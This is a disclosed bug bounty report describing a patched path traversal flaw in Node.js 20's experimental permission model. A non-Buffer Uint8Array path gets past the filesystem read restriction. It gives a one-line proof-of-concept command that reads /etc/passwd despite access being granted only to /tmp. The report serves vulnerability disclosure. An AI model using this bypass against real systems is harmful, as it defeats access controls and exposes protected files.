# Path traversal through path stored in Uint8Array in Node.js 20

## Report Details
- **Report ID**: 2256167
- **URL**: https://hackerone.com/reports/2256167
- **State**: Closed
- **Severity**: high
- **Submitted**: 2023-11-17T17:45:17.441Z
- **Disclosed**: 2024-01-20T16:26:31.233Z

## Reporter
- **Username**: tniessen
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
Various `node:fs` functions allow specifying paths as either strings or `Uint8Array` objects. In Node.js environments, the `Buffer` class extends the `Uint8Array` class. Node.js prevents path traversal through strings (see CVE-2023-30584) and `Buffer` objects (see CVE-2023-32004), but not through non-`Buffer` `Uint8Array` objects.

This is distinct from CVE-2023-32004 ([report 2038134](https://hackerone.com/reports/2038134)), which only referred to `Buffer` objects. However, the vulnerability follows the same pattern using `Uint8Array` instead of `Buffer`.

## Steps To Reproduce:

The following Node.js command prints the contents of `/etc/passwd` despite having been granted access to `/tmp` only. This relies on the fact that `TextDecoder` produces `Uint8Array` objects that are not `Buffer` objects.

```
$ node --experimental-permission \
        --allow-fs-read=/tmp/ \
        -p 'fs.readFileSync(new TextEncoder().encode("/tmp/../etc/passwd"))'
<Buffer 72 6f 6f 74 3a 78 3a 30 3a 30 3a 3a 2f 72 6f 6f 74 3a 2f 62 69 6e 2f 62 61 73 68 0a 6e 6f 62 6f 64 79 3a 78 3a 36 35 35 33 34 3a 36 35 35 33 34 3a 4e ... 2103 more bytes>
```

## Supporting Material/References:

* CVE-2023-30584 ([report 1952978](https://hackerone.com/reports/1952978))
* Commit [205f1e6](https://github.com/nodejs/node/commit/205f1e643e25648173239b2de885fec430268492) prevents CVE-2023-30584 but ignores non-string inputs.
* CVE-2023-32004 ([report 2038134](https://hackerone.com/reports/2038134))
* Commit [1f64147](https://github.com/nodejs/node/commit/1f64147eb607f82060e08884f993597774c69280) prevents CVE-2023-32004 but ignores non-`Buffer` objects.

## Patch

I provided a patch, which was merged into Node.js 20 as [commit fa5dae1944](https://github.com/nodejs/node/commit/fa5dae1944).

## Impact

Equivalent to CVE-2023-30584 ([report 1952978](https://hackerone.com/reports/1952978)) and CVE-2023-32004 ([report 2038134](https://hackerone.com/reports/2038134)).

## Attachments
No attachments
